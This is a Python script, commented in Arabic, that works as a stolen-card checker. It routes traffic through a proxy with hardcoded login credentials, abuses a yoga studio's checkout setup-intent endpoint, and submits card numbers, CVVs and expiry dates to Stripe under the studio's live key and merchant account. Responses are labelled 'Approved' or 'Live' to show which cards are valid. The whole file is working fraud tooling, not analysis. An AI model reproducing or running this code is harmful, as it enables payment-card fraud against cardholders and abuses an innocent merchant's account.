import aiohttp
import asyncio
import uuid
import random
from tenacity import retry, stop_after_attempt, wait_fixed

# قائمة البروكسيات المحدثة ببيانات Proxy-Cheap الجديدة الخاصة بك
PROXIES_LIST = [
    "thehub.proxy-cheap.com:8080:PH7r6Wo5hJPbBpX:3I1X2Hp5cqxrLNS",
]

def get_random_proxy():
    """تحويل تنسيق البروكسي إلى صيغة الرابط المدعومة مع المصادقة الصحيحة"""
    proxy = random.choice(PROXIES_LIST)
    host, port, user, password = proxy.split(':')
    return f"http://{user}:{password}@{host}:{port}"

async def getStr(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except: return None

@retry(stop=stop_after_attempt(3), wait=wait_fixed(2))
async def kasper_gate(cc, mes, ano, cvv, *args, **kwargs):
    
    # تنظيف البيانات
    if len(ano) == 4: ano = ano[2:]
    mes = str(mes).zfill(2) 
    
    proxy_url = get_random_proxy()

    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Referer': 'https://studio.xuanlanyoga.com/checkout',
    }

    # استخدام TCPConnector لتجاوز مشاكل SSL مع البروكسي
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            # 1. جلب السكرت مع البروكسي
            async with session.get(
                'https://studio.xuanlanyoga.com/api/billings/setup_intent', 
                headers=headers, 
                proxy=proxy_url, 
                timeout=30
            ) as r1:
                res1 = await r1.text()
                cs = await getStr(res1, '"setup_intent":"', '"')
                if not cs: return "Error ⚠️", "Site Block / Proxy Issue"
                seti = cs.split('_secret')[0]

            # 2. بيانات سترايب
            stripe_data = {
                'payment_method_data[type]': 'card',
                'payment_method_data[card][number]': cc,
                'payment_method_data[card][cvc]': cvv,
                'payment_method_data[card][exp_month]': mes,
                'payment_method_data[card][exp_year]': ano,
                'key': 'pk_live_DImPqz7QOOyx70XCA9DSifxb',
                '_stripe_account': 'acct_1GAgLOKR6BrF0rdR',
                'client_secret': cs,
                'payment_method_data[guid]': str(uuid.uuid4()),
                'payment_method_data[muid]': str(uuid.uuid4()),
                'payment_method_data[sid]': str(uuid.uuid4()),
            }

            # الفحص في سترايب مع البروكسي
            async with session.post(
                f'https://api.stripe.com/v1/setup_intents/{seti}/confirm', 
                data=stripe_data, 
                headers=headers, 
                proxy=proxy_url, 
                timeout=30
            ) as r2:
                res2 = await r2.text()

            # تحليل النتيجة (إضافة حالات الـ Live لكي لا تظهر كـ Declined)
            if '"status": "succeeded"' in res2: 
                return "Approved ✅", "Succeeded"
            elif 'insufficient_funds' in res2: 
                return "Approved ✅", "Low Funds"
            elif 'incorrect_cvc' in res2 or 'security_code_match' in res2: 
                return "Approved ✅", "CVC Incorrect / Live"
            elif 'stolen_card' in res2 or 'lost_card' in res2:
                return "Declined ❌", "Stolen/Lost Card"
            elif '"message": "' in res2:
                msg = await getStr(res2, '"message": "', '"')
                return "Declined ❌", msg
            else: 
                return "Error ⚠️", f"Stripe Unknown: {res2[:60]}"

        except Exception as e:
            return "Error ⚠️", f"Proxy/Conn Error: {str(e)[:50]}"
